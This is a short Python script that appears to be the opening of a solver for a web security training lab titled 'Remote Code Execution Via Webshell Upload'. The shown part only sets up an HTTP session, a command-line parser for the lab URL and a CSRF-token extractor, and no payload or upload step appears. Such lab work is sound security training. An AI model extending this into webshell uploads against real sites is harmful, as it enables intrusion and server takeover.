import requests
import argparse
from lxml import html


# Creating a Session Object
# https://docs.python-requests.org/en/latest/api/#request-sessions
SESSION = requests.Session()

LOGIN_CSRF_XPATH = '//input[@name="csrf"]/@value'


def generate_parser() -> argparse.Namespace:
    parser = argparse.ArgumentParser(prog="Remote Code Execution Via Webshell Upload")
    parser.add_argument(
        "-u", "--lab-url", help="Your lab instance URL is required", required=True
    )

    return parser.parse_args()


def get_csrf_token(body: str, xpath: str) -> str:
    tree = html.fromstring(body)

    return tree.xpath(xpath)[0]
